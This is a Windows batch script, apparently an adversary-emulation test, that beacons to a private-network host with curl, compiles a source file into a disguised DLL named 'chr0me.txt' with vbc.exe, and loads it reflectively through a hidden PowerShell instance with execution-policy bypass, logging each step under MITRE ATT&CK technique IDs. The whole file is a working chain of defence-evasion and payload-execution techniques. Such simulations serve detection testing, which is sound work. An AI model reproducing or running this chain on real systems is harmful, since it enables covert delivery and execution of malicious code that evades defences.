@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8477\cc372ec7
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8477-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=chr0me.txt
SET njozco=file.txt
SET kkjwr=8477

SET wvxs=%APPDATA%\!ufeybybm!
SET jhpp=%APPDATA%\!ufeybybm!\macula-simulations.log
SET sjnf=T1500
SET fhdu=T1218

if not exist "!wvxs!" mkdir "!wvxs!" >nul 2>&1

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!jhpp!" 2>nul
curl -k -s -o nul "!uouoq!"
set mzxq=1
set ujrn=
if not !errorlevel! equ 0 (
    set mzxq=0
    set ujrn=curl_failed_!errorlevel!
)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][!lqyereup!]: !ufeybybm!-!kkjwr!-!fhdu!|Signed Binary Proxy Execution=!mzxq!:!ujrn!>> "!jhpp!" 2>nul
echo [!vxwe!][DEBUG][!lqyereup!]: heartbeat_end=!mzxq!>> "!jhpp!" 2>nul

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!jhpp!" 2>nul
cd /d "!recnn!" >nul 2>&1
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][DEBUG][!lqyereup!]: chdir_end=!errorlevel!>> "!jhpp!" 2>nul

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!jhpp!" 2>nul
set mzxq=1
set ujrn=
vbc.exe /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
if not !errorlevel! equ 0 (
    set mzxq=0
    set ujrn=compile_failed_!errorlevel!
)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!vxwe!][!lqyereup!]: !ufeybybm!-!kkjwr!-!sjnf!|Compile After Delivery=!mzxq!:!ujrn!>> "!jhpp!" 2>nul
echo [!vxwe!][DEBUG][!lqyereup!]: compile_end=!mzxq!>> "!jhpp!" 2>nul

if exist "!hpnjatpj!" (
    for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
    set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
    echo [!vxwe!][DEBUG][!lqyereup!]: execution_start=!hpnjatpj!>> "!jhpp!" 2>nul
    set mzxq=1
    set ujrn=
    %WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" >nul 2>&1
    if not !errorlevel! equ 0 (
        set mzxq=0
        set ujrn=exec_failed_!errorlevel!
    )
    for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
    set vxwe=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
    echo [!vxwe!][!lqyereup!]: !ufeybybm!-!kkjwr!-!fhdu!|Signed Binary Proxy Execution=!mzxq!:!ujrn!>> "!jhpp!" 2>nul
    echo [!vxwe!][DEBUG][!lqyereup!]: execution_end=!mzxq!>> "!jhpp!" 2>nul
)